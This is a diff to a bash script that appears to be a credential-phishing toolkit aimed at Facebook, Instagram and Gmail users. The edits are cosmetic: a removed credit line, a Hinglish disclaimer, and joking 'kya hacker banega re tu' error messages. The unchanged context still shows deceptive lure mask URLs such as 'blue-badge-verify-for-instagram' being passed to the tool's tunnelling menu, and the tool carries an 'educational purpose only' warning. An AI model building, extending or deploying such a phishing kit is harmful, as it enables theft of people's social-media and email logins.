@@ -1,7 +1,5 @@
 #!/bin/bash
 ##created by shivam adhau
-##big thanks to Akshay-Arjun
-
 
 
 ## ANSI colors (FG & BG)
@@ -179,7 +177,8 @@ about() {
 		${RED}Warning:${WHITE}
 		${CYAN}This Tool is made for educational purpose only ${RED}!${WHITE}
 		${CYAN}I will not be responsible for any misuse of this toolkit ${RED}!${WHITE}
-
+                ${CYAN} In dasi language agar Tum Ne Galat Kaam Kiya to Uski Zemedar tum Kudra Hoge
+		
 		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
 
 	EOF
@@ -321,7 +320,7 @@ site_facebook() {
 			mask='https://get-messenger-premium-features-free'
 			tunnel_menu;;
 		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again...(kya hacker banega re tu)"
 			{ sleep 1; clear; banner_small; site_facebook; };;
 	esac
 }
@@ -357,7 +356,7 @@ site_instagram() {
 			mask='https://blue-badge-verify-for-instagram'
 			tunnel_menu;;
 		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again...(kya hacker banega re tu)"
 			{ sleep 1; clear; banner_small; site_instagram; };;
 	esac
 }
@@ -388,7 +387,7 @@ site_gmail() {
 			mask='https://vote-for-the-best-social-media'
 			tunnel_menu;;
 		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED}  Invalid Option, Try Again...(kya hacker banega re tu)"
 			{ sleep 1; clear; banner_small; site_gmail; };;
 	esac
 }
@@ -578,7 +577,7 @@ main_menu() {
 		0 | 00 )
 			msg_exit;;
 		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} option to sahi dalna sekh..."
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED}  Invalid Option, Try Again...(kya hacker banega re tu)"
 			{ sleep 1; main_menu; };;
 	
 	esac
